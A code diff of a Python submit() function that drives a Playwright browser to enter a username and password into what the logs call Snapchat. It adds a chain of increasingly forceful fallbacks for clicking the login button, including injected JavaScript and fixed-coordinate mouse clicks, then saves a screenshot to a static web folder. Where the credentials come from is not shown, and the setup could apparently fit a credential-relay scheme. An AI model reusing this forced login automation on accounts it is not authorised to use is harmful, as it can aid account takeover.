@@ -177,7 +177,7 @@ def submit():
                     except Exception as e:
                         print(f"  username error: {e}")
                     
-                    time.sleep(0.5)
+                    time.sleep(0.55)
                     
                     # Fill password
                     try:
@@ -186,63 +186,106 @@ def submit():
                     except Exception as e:
                         print(f"  password error: {e}")
                     
-                    time.sleep(0.7)
+                    time.sleep(0.8)
                     
-                    # === AGGRESSIVE LOG IN BUTTON CLICK ===
+                    # === VERY AGGRESSIVE LOG IN CLICK ===
                     clicked = False
                     
-                    selectors = [
+                    # 1. Best selectors first
+                    for sel in [
                         'button:has-text("Log In")',
                         'button:has-text("Log in")',
                         'button[type="submit"]',
-                        'button:has-text("Continue")',
-                        'button[aria-label*="log"]',
-                        'form button',
-                        'button'
-                    ]
-                    
-                    for sel in selectors:
+                        'button:has-text("Continue")'
+                    ]:
                         try:
                             btn = p.locator(sel).first
                             if btn.count() > 0:
-                                btn.wait_for(state="visible", timeout=3000)
-                                btn.click(timeout=6000, force=True)
+                                btn.wait_for(state="visible", timeout=2500)
+                                btn.scroll_into_view_if_needed()
+                                btn.click(timeout=7000, force=True)
                                 clicked = True
-                                print(f"  ✅ SUCCESSFULLY CLICKED using: {sel}")
+                                print(f"  ✅ CLICKED with selector: {sel}")
                                 break
                         except Exception as e:
-                            print(f"  {sel} failed: {str(e)[:60]}")
+                            print(f"  selector {sel} failed: {str(e)[:55]}")
                     
-                    # Strong fallback: press Enter multiple times
+                    # 2. Try any button that looks like a submit
                     if not clicked:
                         try:
-                            p.keyboard.press('Enter')
-                            time.sleep(0.3)
-                            p.keyboard.press('Enter')
-                            clicked = True
-                            print("  ✅ CLICKED via Enter key (fallback)")
+                            buttons = p.locator('button')
+                            for i in range(min(buttons.count(), 10)):
+                                b = buttons.nth(i)
+                                try:
+                                    txt = (b.text_content() or "").lower()
+                                    if b.is_visible():
+                                        b.click(timeout=4000, force=True)
+                                        clicked = True
+                                        print(f"  ✅ CLICKED button #{i} (text: {txt[:30]})")
+                                        break
+                                except:
+                                    continue
                         except:
                             pass
                     
-                    # Last resort: click approximate location of yellow button
+                    # 3. Keyboard fallbacks
                     if not clicked:
                         try:
-                            p.mouse.click(640, 355)   # center of yellow Log In button
-                            time.sleep(0.2)
+                            p.keyboard.press('Enter')
+                            time.sleep(0.35)
                             p.keyboard.press('Enter')
                             clicked = True
-                            print("  ✅ CLICKED via mouse + Enter")
+                            print("  ✅ CLICKED via Enter x2")
                         except:
                             pass
                     
-                    print(f"[SUBMIT] Login click finished. Waiting 3.5s for page to react...")
-                    time.sleep(3.5)
+                    # 4. JavaScript click on the yellow button (most reliable in many cases)
+                    if not clicked:
+                        try:
+                            p.evaluate("""
+                                () => {
+                                    const btns = document.querySelectorAll('button');
+                                    for (let b of btns) {
+                                        const t = (b.textContent || '').toLowerCase();
+                                        if (t.includes('log in') || t.includes('log in') || t.includes('continue')) {
+                                            b.click();
+                                            return true;
+                                        }
+                                    }
+                                    // last try: click first visible button
+                                    for (let b of btns) {
+                                        if (b.offsetParent !== null) {
+                                            b.click();
+                                            return true;
+                                        }
+                                    }
+                                    return false;
+                                }
+                            """)
+                            clicked = True
+                            print("  ✅ CLICKED via JavaScript")
+                        except Exception as e:
+                            print(f"  JS click failed: {e}")
                     
-                    # Force fresh screenshot so you can SEE the result
+                    # 5. Absolute last resort - mouse click at button area
+                    if not clicked:
+                        try:
+                            p.mouse.click(640, 355)
+                            time.sleep(0.25)
+                            p.keyboard.press('Enter')
+                            clicked = True
+                            print("  ✅ CLICKED via mouse coordinate")
+                        except:
+                            pass
+                    
+                    print(f"[SUBMIT] All click attempts done. Waiting 3.8s for Snapchat to process...")
+                    time.sleep(3.8)
+                    
+                    # Force fresh screenshot so you can see what happened after the click
                     try:
                         path = os.path.join(STATIC_DIR, 'screenshot.png')
                         p.screenshot(path=path, full_page=False)
-                        print("  📸 Fresh screenshot after click")
+                        print("  📸 Screenshot taken after login click")
                     except:
                         create_fresh_live_screenshot()
                     
